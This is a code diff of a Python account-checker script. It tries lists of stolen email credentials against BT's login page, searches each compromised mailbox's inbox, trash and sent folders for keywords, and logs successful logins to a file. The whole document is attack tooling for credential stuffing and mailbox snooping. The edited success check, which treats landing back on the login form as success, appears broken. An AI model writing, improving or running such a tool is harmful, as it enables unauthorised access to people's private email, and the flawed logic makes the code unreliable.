@@ -14,6 +14,7 @@ def parse_arguments():
     parser.add_argument("--succ-logins-file", default="succ-logins.csv", help="File to save successful logins (default: succ-logins.csv)")
     parser.add_argument("--log-file", default="login_script.log", help="Log file to store script logs (default: login_script.log)")
     parser.add_argument("--log-level", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"], help="Logging level (default: INFO)")
+    parser.add_argument("--login-url", default="https://home.bt.com/login/loginform", help="URL for login and logout")  # Use the same URL for login and logout
     return parser.parse_args()
 
 def setup_logging(log_file, log_level):
@@ -39,7 +40,7 @@ def login(username, password, login_url, logout_url):
 
     response = session.post(login_url, data=login_data)
 
-    if response.status_code == 200 and "signin1.bt.com/btmail/secure/emaillogin" in response.url:
+    if response.status_code == 200 and "home.bt.com/login/loginform" in response.url:
         return session
     return None
 
@@ -49,7 +50,7 @@ def logout(session, logout_url):
 def check_keywords(session, keywords):
     folders = ["inbox", "trash", "sent"]  # Add additional folders here
     for folder in folders:
-        response = session.get(f"https://signin1.bt.com/btmail/secure/{folder}")
+        response = session.get(f"https://home.bt.com/{folder}")
         soup = BeautifulSoup(response.text, "html.parser")
         text = soup.get_text()
         if any(keyword in text for keyword in keywords):
@@ -75,7 +76,7 @@ def check_logins(logins, keywords, login_url, logout_url, succ_logins_file):
             except Exception as e:
                 logging.error(f"Error with login {login['email']}: {e}")
             finally:
-                logout(session, logout_url)
+                logout(session, login_url)  # Use login_url for logout since it's the same URL
                 time.sleep(5)
         else:
             logging.error(f"Login failed: {login['email']}")
@@ -141,7 +142,7 @@ def main_menu(logins, keywords, succ_logins_file, login_url, logout_url):
 
         if choice == "1":
             print("\nChecking logins...")
-            check_logins(logins, keywords, login_url, logout_url, succ_logins_file)
+            check_logins(logins, keywords, login_url, login_url, succ_logins_file)  # Use login_url for both login and logout
             print("\n")
         elif choice == "2":
             print("\nContents of logins.csv:")
@@ -188,7 +189,8 @@ def main():
     logins = read_file(args.logins_file)
     keywords = read_file(args.keywords_file)
 
-    main_menu(logins, keywords, args.succ_logins_file, args.login_url, args.logout_url)
+    main_menu(logins, keywords, args.succ_logins_file, args.login_url, args.login_url)  # Use login_url for both login and logout
 
 if __name__ == "__main__":
     main()
+
